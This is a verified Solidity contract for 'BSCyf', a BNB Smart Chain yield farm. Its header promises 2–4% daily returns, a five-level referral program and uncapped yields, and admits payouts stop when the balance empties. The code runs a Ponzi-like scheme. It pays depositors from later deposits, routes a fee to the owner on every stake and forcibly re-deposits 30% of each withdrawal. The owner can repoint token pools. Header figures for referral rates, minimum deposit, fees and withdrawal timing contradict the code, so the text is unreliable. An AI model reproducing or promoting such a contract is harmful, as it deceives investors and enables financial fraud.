/**
 *Submitted for verification at BscScan.com on 2022-02-03
*/

/*   BSCyf - Community Experimental yield farm on Binance Smart Chain.
 *   The only official platform BSCyf project!
 *   Version 1.0.1
 *   SPDX-License-Identifier: Unlicensed
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bscyf.com                                      │
 *   │                                                                       │
 *   │   Telegram Live Support: @bsctrecks                                │
 *   │   Telegram Public Chat: @bscyf                                   │
 *   │                                                                       │
 *   │   E-mail: [email protected]                                         │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet
 *   2) Choose one of the tariff plans, enter the BNB amount (0.02 BNB minimum) using our website "Stake" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *   5) Antiy-Drain system implemented to ensure system longevity
 *   6) We aim to build a strong community through team work, pls share your link and earn more...
 *
 *   [STAKING CONDITIONS]
 *
 *   - Minimal deposit: 1 [SUPPORTED_ALT], no maximal limit
 *   - Total income: based on your tarrif plan (from 2% to 4% daily) 
 *   - Yields every seconds, withdraw any time
 *   - Yield Cap from 160% to Infinity 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5-level referral reward: 8% - 2% - 1% - 0.75% - 0.25%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 88% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 12% Advertising and promotion expenses, Support work, technical functioning, administration fee
 *
 *   Note: This is experimental community project,
 *   which means this project has high risks as well as high profits.
 *   Once contract balance drops to zero payments will stops,
 *   deposit at your own risk.
 */

pragma solidity 0.8.11;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library SafeERC20 {
    using SafeMath for uint;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

contract BSCYieldFarm {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    uint256 constant public STAKE_MIN_AMOUNT = 0.001 ether; 
    uint256 constant internal ANTIWHALES = 3000;
    uint256[] public REFERRAL_PERCENTS = [700, 300, 100, 75, 25];
    uint256 constant public PROJECT_FEE = 500;
    uint256 constant public PERCENTS_DIVIDER = 10000;
    uint256 constant public TIME_STEP = 1 days;

    struct Tokens{
        uint256 tokenID;
        address token;
        uint stakeMinAmount;
        uint256 totalStaked;
        uint256 totalHarvest;
        uint256 totalRefBonus;
    }

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    struct Deposits {
        uint8 plan;
        uint256 amount;
        uint256 start;
    }

    struct tDeposits{
        uint256 checkpoint;
        uint256 bonus;
        uint256 totalBonus;
        uint256 withdrawn;
    }

    struct User {
        address referrer;
        uint256[5] levels;
    }

    mapping (address => User) public users;

    Plan[] internal plans;

    mapping(uint => Tokens) public tokens;

    mapping(address => Tokens) internal _tokens;

    mapping(address => mapping(address => tDeposits)) public tdeposits;

    mapping(address => mapping(address => Deposits[])) public deposits;

    uint256 _lastTokenID = 0; 

    bool public started;
    address internal contract_;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor() {
        contract_ = msg.sender;
        plans.push(Plan(20000, 200));
        plans.push(Plan(40, 400));
        plans.push(Plan(60, 350));
        plans.push(Plan(90, 300));
        plans.push(Plan(60, 200));
        Tokens storage token = tokens[_lastTokenID];
        token.tokenID = _lastTokenID;
        token.stakeMinAmount = STAKE_MIN_AMOUNT;
        _lastTokenID++;
    }

    modifier onlyContract(){
        require(msg.sender == contract_, 'Forbiden!');
        _;
    }

    function stakeBNB(address referrer, uint8 plan) public payable {
        if (!started) {
            require(msg.sender == contract_, 'notStared');
        }
        
        require(plan < 4, "Invalid plan");
        uint _amount = msg.value;
        address _userID = msg.sender;

        require(_amount >= tokens[0].stakeMinAmount, 'MiniMumRequired');

        uint256 _fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        payable(contract_).transfer(_fee);
        emit FeePayed(_userID, _fee);
        doStaking(_userID, referrer, plan, _amount, 0);
    }

    function stake(address referrer, uint8 plan,  uint256 tokenID, uint256 _amount) public {
        if (!started) {
            if (msg.sender == contract_) {
                started = true;
            } else revert("Not started yet");
        }
        require(plan < 4, "Invalid plan");
        address _userID = msg.sender;
        
        IERC20 salt = IERC20(tokens[tokenID].token);

        require(_amount >= tokens[tokenID].stakeMinAmount, 'MiniMumRequired');

        require(_amount <= salt.allowance(msg.sender, address(this)));
        salt.safeTransferFrom(msg.sender, address(this), _amount);

        uint256 _fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        // tdeposits[contract_][token.token].bonus.add(_fee);
        salt.safeTransfer(contract_, _fee);
        emit FeePayed(_userID, _fee);

        doStaking(_userID, referrer, plan, _amount, tokenID);
    }

    function doStaking(address _userID, address referrer, uint8 plan, uint256 _amount, uint256 _tokenID) internal{
        User storage user = users[_userID];
        Tokens storage token = tokens[_tokenID];

        if (user.referrer == address(0)) {
            if (deposits[referrer][token.token].length > 0 && referrer != _userID) {
                user.referrer = referrer;
            }
            else{
                user.referrer = contract_;
            }
        }
        address upline = user.referrer;
        for (uint256 i = 0; i < 5; i++) {
            if (upline != address(0)) {
                users[upline].levels[i] = users[upline].levels[i].add(1);
                uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                tdeposits[upline][token.token].bonus = tdeposits[upline][token.token].bonus.add(amount);
                tdeposits[upline][token.token].totalBonus = tdeposits[upline][token.token].totalBonus.add(amount);
                token.totalRefBonus = token.totalRefBonus.add(amount);
                emit RefBonus(upline, _userID, i, amount);
                upline = users[upline].referrer;
            } else break;
        }
        if (deposits[_userID][token.token].length == 0) {
            tdeposits[_userID][token.token].checkpoint = block.timestamp;
            emit Newbie(_userID);
        }

        deposits[_userID][token.token].push(Deposits(plan, _amount, block.timestamp));

        // totalInvested = totalInvested.add(msg.value);
        token.totalStaked = token.totalStaked.add(_amount);

        emit NewDeposit(_userID, plan, _amount);
    }
    
    function withdraw(uint256 tokenID) public {
        address _userID = msg.sender;
        Tokens storage token = tokens[tokenID];
        // Withdrawals are allowed only once per 12hrs
        require(block.timestamp >= tdeposits[_userID][token.token].checkpoint.add(2 hours), '2hrsLimit');
        
        uint256 totalAmount = getUserDividends(_userID, tokenID);

        uint256 referralBonus = getUserReferralBonus(_userID, tokenID);
        if (referralBonus > 0) {
            tdeposits[_userID][token.token].bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        require(totalAmount > 0, "User has no dividends");

        // Apply AntiWhale protocol
        uint256 contractBalance = address(this).balance;
        IERC20 salt;
        if(tokenID != 0){
            salt = IERC20(token.token);
            contractBalance = salt.balanceOf(address(this));
        }
        uint256 _maxAllowed = contractBalance.mul(ANTIWHALES).div(PERCENTS_DIVIDER);
        // Prevents Users from Draining Smartcontract [withdrawal up 30% of contract balance not allowed]
    
        if (_maxAllowed < totalAmount) {
            tdeposits[_userID][token.token].bonus = totalAmount.sub(_maxAllowed);
            tdeposits[_userID][token.token].totalBonus = tdeposits[_userID][token.token].totalBonus.add(tdeposits[_userID][token.token].bonus);
            totalAmount = _maxAllowed;
        }

        tdeposits[_userID][token.token].checkpoint = block.timestamp;
        tdeposits[_userID][token.token].withdrawn = tdeposits[_userID][token.token].withdrawn.add(totalAmount);
        
        // Transfer only 70% of User's Available FUNDS and force re-entry
        uint256 _withdrawn = totalAmount.mul(7000).div(PERCENTS_DIVIDER);
        if(tokenID != 0){
            salt.safeTransfer(msg.sender, _withdrawn);
        }
        else{
            payable(msg.sender).transfer(_withdrawn);
        }

        emit Withdrawn(msg.sender, _withdrawn);
        // Make User's re-entry with 30% balance.
        
        deposits[_userID][token.token].push(Deposits(4, totalAmount.sub(_withdrawn), block.timestamp));

        token.totalStaked = token.totalStaked.add(totalAmount.sub(_withdrawn));
        token.totalHarvest = token.totalHarvest.add(_withdrawn);

        emit NewDeposit(msg.sender, 4, totalAmount.sub(_withdrawn));
    }

    function getContractBalance(uint256 tokenID) public view returns (uint256) {
        if(tokenID > 0){
            Tokens memory token = tokens[tokenID];
            IERC20 salt = IERC20(token.token);
            return salt.balanceOf(address(this));
        }
        else{
            return address(this).balance;
        }
    }

    function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getUserDividends(address userAddress, uint256 tokenID) public view returns (uint256) {
        
        Tokens memory token = tokens[tokenID];

        uint256 totalAmount;

        for (uint256 i = 0; i < deposits[userAddress][token.token].length; i++) {
            uint256 finish = deposits[userAddress][token.token][i].start.add(plans[deposits[userAddress][token.token][i].plan].time.mul(1 days));
            if (tdeposits[userAddress][token.token].checkpoint < finish) {
                uint256 share = deposits[userAddress][token.token][i].amount.mul(plans[deposits[userAddress][token.token][i].plan].percent).div(PERCENTS_DIVIDER);
                uint256 from = deposits[userAddress][token.token][i].start > tdeposits[userAddress][token.token].checkpoint ? deposits[userAddress][token.token][i].start : tdeposits[userAddress][token.token].checkpoint;
                uint256 to = finish < block.timestamp ? finish : block.timestamp;
                if (from < to) {
                    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
                }
            }
        }

        return totalAmount;
    }

    function getUserTotalWithdrawn(address userAddress, uint256 tokenID) public view returns (uint256) {
        Tokens memory token = tokens[tokenID];
        return tdeposits[userAddress][token.token].withdrawn;
    }

    function getUserCheckpoint(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return tdeposits[userAddress][token.token].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
        return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress) public view returns(uint256) {
        return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
    }

    function getUserReferralBonus(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return tdeposits[userAddress][token.token].bonus;
    }

    function getUserReferralTotalBonus(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return tdeposits[userAddress][token.token].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return tdeposits[userAddress][token.token].totalBonus.sub(tdeposits[userAddress][token.token].bonus);
    }

    function getUserAvailable(address userAddress, uint256 tokenID) public view returns(uint256) {
        return getUserReferralBonus(userAddress, tokenID).add(getUserDividends(userAddress, tokenID));
    }

    function getUserAmountOfDeposits(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return deposits[userAddress][token.token].length;
    }

    function getUserTotalDeposits(address userAddress, uint256 tokenID) public view returns(uint256 amount) {
        Tokens memory token = tokens[tokenID];
        for (uint256 i = 0; i < deposits[userAddress][token.token].length; i++) {
            amount = amount.add(deposits[userAddress][token.token][i].amount);
        }
    }

    function getUserDepositInfo(address userAddress, uint256 index, uint256 tokenID) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
        Tokens memory token = tokens[tokenID];
        plan = deposits[userAddress][token.token][index].plan;
        percent = plans[plan].percent;
        amount = deposits[userAddress][token.token][index].amount;
        start = deposits[userAddress][token.token][index].start;
        finish = deposits[userAddress][token.token][index].start.add(plans[deposits[userAddress][token.token][index].plan].time.mul(1 days));
    }

    function getSiteInfo(uint256 tokenID) public view returns(uint256 _totalInvested, uint256 _totalBonus) {
        Tokens memory token = tokens[tokenID];
        return(token.totalStaked, token.totalRefBonus);
    }

    function getUserInfo(address userAddress, uint256 tokenID) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
        return(getUserTotalDeposits(userAddress, tokenID), getUserTotalWithdrawn(userAddress, tokenID), getUserTotalReferrals(userAddress));
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function setToken(address _token, uint256 _tokenID, uint256 _stakeMinAmount) public onlyContract{
        Tokens storage token = tokens[_tokenID];
        if(_tokenID != 0){
            token.token = _token;
        }
        token.stakeMinAmount = _stakeMinAmount;
    }

    function addToken(address _token, uint256 _stakeMinAmount) public onlyContract{
        require(_tokens[_token].tokenID == 0, 'DoubleEntry');
        Tokens storage token = tokens[_lastTokenID];
        token.token = _token;
        token.tokenID = _lastTokenID;
        token.stakeMinAmount = _stakeMinAmount;
        _lastTokenID++;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}